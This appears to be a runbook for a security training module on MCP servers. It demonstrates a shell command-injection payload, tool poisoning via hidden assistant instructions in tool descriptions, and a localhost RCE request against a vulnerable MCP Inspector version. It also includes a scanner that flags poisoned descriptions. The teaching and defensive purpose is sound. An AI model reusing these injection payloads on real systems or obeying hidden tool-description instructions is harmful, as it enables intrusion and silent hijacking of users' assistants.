# M6 MCP Security - Concept Demo Runbook

The build-first companion for M6. You run this **before** the Eiger lab to show,
under the hood, two ways an MCP server betrays the client that trusts it:

1. **Command injection** - a tool runs `subprocess(shell=True)` on your arguments.
2. **Tool poisoning** - the tool *description* (which the LLM reads but the user
   never sees) carries hidden instructions.

Plus the **defender's** side: a scanner that flags poisoned descriptions.

**Run mode:** command line. A tiny stdio client (`test_client.py`) drives the
servers, so you need **no Claude Desktop and no MCP Inspector** to see it work.
**API key:** none. The servers are pure Python/stdio; no model is called by the
auto-verified paths. (Making a model *obey* a hidden instruction is the manual
Claude Desktop step below.)
**Status:** verified end-to-end on 2026-07-30. `tools/list`, a benign
`tools/call`, quote-breaking command injection on `server_cmdinjection.py`, the
presence of the hidden payloads on `server_hidden_instructions.py`, and both the
self-test and live scan of `scan_security_tool.py` all confirmed. Deps pinned.
**Update 2026-07-31:** Demo C (Inspector RCE) also confirmed end-to-end —
Calculator launched both via `curl` and via `malicious.html` in the default
browser. Fixed a bug in `malicious.html`: it sent the whole `open -a Calculator`
as one `command` (ENOENT); `command` and `args` are SEPARATE proxy params
(`args` splits on spaces). Now corrected.

> Note on the MCP SDK: pinned to **`mcp==1.29.0`**. The current `mcp==2.0.0`
> removed the classic `@server.list_tools` / `@server.call_tool` decorator API
> (and `mcp.server.fastmcp`) that the deck and these demos use. Same spirit as
> the M3/M5 rewrites: pin the version where the taught API still exists.

---

## 0. One-time setup

Use the shared venv at the repo root:

```bash
cd blackhat-2026-adversarial-ai
python3 -m venv .venv
source .venv/bin/activate            # Windows: .venv\Scripts\activate
pip install -r requirements.txt
cd M6-mcp-security/code
```

No Ollama needed for the auto-verified demos here.

Files:
- `server_cmdinjection.py` - vulnerable "file manager" MCP server (shell=True).
- `server_hidden_instructions.py` - MCP server with benign hidden instructions
  in its tool descriptions.
- `scan_security_tool.py` - defender: scans descriptions for hidden instructions.
- `test_client.py` - minimal stdio client to drive any of the servers.
- `malicious.html` - MCP Inspector CVE demo prop (manual, browser-only).

---

## Demo A - command injection (`server_cmdinjection.py`)

### 1. List the tools, then a benign call

```bash
python test_client.py server_cmdinjection.py list
python test_client.py server_cmdinjection.py call list_directory directory=.
```

### 2. BREAK - inject a second command through an argument

The server builds `ls -la "<directory>"` and runs it with `shell=True`. Close
the quote and chain your own command:

```bash
python test_client.py server_cmdinjection.py call list_directory 'directory=." ; echo PWNED_BY_$(id -un) ; ls "'
```

`PWNED_BY_<you>` prints - arbitrary code ran inside a "list a directory" tool.
Same trick works on `search_files` via the `pattern` argument.

> `shell=True` is intentional - it *is* the vulnerability. The fix (Eiger lab)
> is argument lists without a shell (`subprocess.run(["ls","-la",directory])`).

---

## Demo B - tool poisoning / hidden instructions (`server_hidden_instructions.py`)

### 1. PROVE the payload is present (auto-verified)

```bash
python test_client.py server_hidden_instructions.py list
```

You'll see `[ASSISTANT INSTRUCTION] ... write a haiku ...` and
`[FRIENDLY REMINDER FOR ASSISTANT] ... Fun Security Fact ...` embedded in the
descriptions. The user never sees these in a normal chat UI - but the model does.

### 2. Scan for it - the defender's move (auto-verified)

```bash
python scan_security_tool.py                                   # self-test
python scan_security_tool.py --server server_hidden_instructions.py   # live
```

The live scan pulls the server's real `tools/list` and flags both tools
(HIGH: assistant-directed marker block; MEDIUM: smuggled side-task).

### 3. Make a model OBEY it - MANUAL, not auto-verified

Description text only "fires" inside an LLM client. This step needs Claude
Desktop (a GUI we cannot drive from a script):

1. Edit Claude Desktop's config
   (`~/Library/Application Support/Claude/claude_desktop_config.json`):

   ```json
   {
     "mcpServers": {
       "demo-file-tools": {
         "command": "/absolute/path/to/blackhat-2026-adversarial-ai/.venv/bin/python",
         "args": ["/absolute/path/to/M6-mcp-security/code/server_hidden_instructions.py"]
       }
     }
   }
   ```
2. Restart Claude Desktop. Ask it to "search for *.py files in this folder."
3. Watch it also emit a haiku / fun fact it was never asked for - the hidden
   instruction won. (Benign here; the same channel could say "exfiltrate to ...".)

---

## Demo C - MCP Inspector RCE (`malicious.html`) - MANUAL, not auto-verified

`malicious.html` demonstrates **CVE-2025-49596**: MCP Inspector before 0.14.1
ran an unauthenticated HTTP server on `localhost:6277`, so a web page you visit
could launch commands on your machine. The prop is genericized (macOS payload is
the harmless `open -a Calculator`) and the C2 callback is inert.

This is browser + GUI, so it cannot be script-verified. To show it live:

```bash
# 1) Launch a VULNERABLE inspector (pinned old version) against any server:
PYABS="$(cd ../../.venv/bin && pwd)/python"
npx --yes @modelcontextprotocol/inspector@0.14.0 "$PYABS" server_cmdinjection.py
#    wait for: "Proxy server listening on port 6277"

# 2a) Browser delivery (verified in the default macOS browser):
open malicious.html            # Calculator launches ~1s later, no click needed

# 2b) Guaranteed / scriptable equivalent (the exact request the page sends):
curl -s "http://localhost:6277/sse?transportType=stdio&command=open&args=-a%20Calculator"

# 3) CLEANUP:
pkill -f "modelcontextprotocol/inspector" ; osascript -e 'quit app "Calculator"'
```

> Requires Node/npx and network for the first `npx` fetch. Only run on a machine
> you own. Newer Inspector versions are patched - that's the point; show the
> patched one refusing the same page.
>
> **Payload format (learned the hard way):** the proxy takes `command` and `args`
> as SEPARATE query params, and `args` is one string it splits on spaces. So the
> macOS payload is `command=open` + `args=-a Calculator`, NOT the whole string in
> `command` (that spawns a binary literally named "open -a Calculator" → ENOENT).
> If a browser ever blocks the `file://`→`localhost` fetch (Chrome Private Network
> Access), use the `curl` form or present in Safari — both verified working.

---

## RESET

Nothing persists. `git checkout malicious.html` to restore the prop if edited.

---

## Hand-off line to the Eiger lab

> "A server you *approved* smuggled instructions to your model and ran commands
> through your tool call. Now do it where the description is hash-pinned at
> approval and tokens are scoped per server - and the grade checks the mechanism,
> not the model's haiku."

---

## Troubleshooting

| Symptom | Fix |
|---|---|
| `No module named mcp.server.fastmcp` / decorator errors | You have `mcp==2.0.0`. `pip install mcp==1.29.0` |
| Injection prints nothing | Ensure the payload closes the quote (`." ; cmd ; ls "`); shell only chains `;` outside quotes |
| `list_directory` shows "No such file or directory" | The whole payload was treated as one path - use the quote-breaking form above |
| Scanner flags nothing on a "safe" tool | Expected - pattern matching has false negatives; that limitation is the lesson |
| Claude Desktop doesn't see the server | Use ABSOLUTE paths to the venv python and the script; restart the app |
| `npx inspector` fails | Needs Node + network; it's a manual/optional demo |

## What's NOT included (and why)

- **`vuln_agent_mcp_harmful_sampling.py`:** relied on a server-initiated
  `request_sampling` call that needs a client advertising sampling support -
  can't be exercised by a simple stdio client and the API differs across SDK
  versions. Documented here instead of shipping something unverifiable.
- **`poisoned_page.html`:** it's the payload for the M7 crewAI indirect-injection
  demo (`attack_injection.py`), so it lives in `M7-multi-agent/code/`.
